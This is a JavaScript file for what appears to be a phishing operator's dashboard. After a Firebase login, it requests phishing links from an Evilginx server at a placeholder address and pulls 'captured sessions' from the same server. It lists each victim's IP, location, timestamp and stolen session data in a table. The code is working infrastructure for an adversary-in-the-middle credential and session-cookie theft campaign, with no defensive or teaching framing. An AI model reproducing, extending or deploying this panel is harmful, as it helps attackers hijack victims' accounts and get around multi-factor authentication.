document.addEventListener("DOMContentLoaded", function () {
    const auth = firebase.auth();

    function login() {
        let email = document.getElementById("email").value;
        let password = document.getElementById("password").value;

        auth.signInWithEmailAndPassword(email, password)
            .then(() => {
                window.location.href = "dashboard.html";
            })
            .catch((error) => {
                document.getElementById("error-message").textContent = error.message;
            });
    }

    function logout() {
        auth.signOut().then(() => {
            window.location.href = "index.html";
        });
    }

    function generateLink() {
        fetch("http://YOUR_EVILGINX_SERVER_IP:5000/generate_link")
            .then(response => response.json())
            .then(data => {
                document.getElementById("output").innerHTML = `<p>Generated Link: <a href="${data.link}" target="_blank">${data.link}</a></p>`;
            })
            .catch(error => console.error("Error:", error));
    }

    function fetchCapturedSessions() {
        fetch("http://YOUR_EVILGINX_SERVER_IP:5000/captured_sessions")
            .then(response => response.json())
            .then(data => {
                const tableBody = document.querySelector("#data-table tbody");
                tableBody.innerHTML = "";

                data.forEach(session => {
                    let row = `<tr>
                        <td>${session.id}</td>
                        <td>${session.ip}</td>
                        <td>${session.location}</td>
                        <td>${session.timestamp}</td>
                        <td>${session.data}</td>
                    </tr>`;
                    tableBody.innerHTML += row;
                });
            })
            .catch(error => console.error("Error:", error));
    }

    document.getElementById("login-btn")?.addEventListener("click", login);
    document.getElementById("logout-btn")?.addEventListener("click", logout);
    document.getElementById("generate-link")?.addEventListener("click", generateLink);
    document.getElementById("captured-sessions")?.addEventListener("click", fetchCapturedSessions);
});
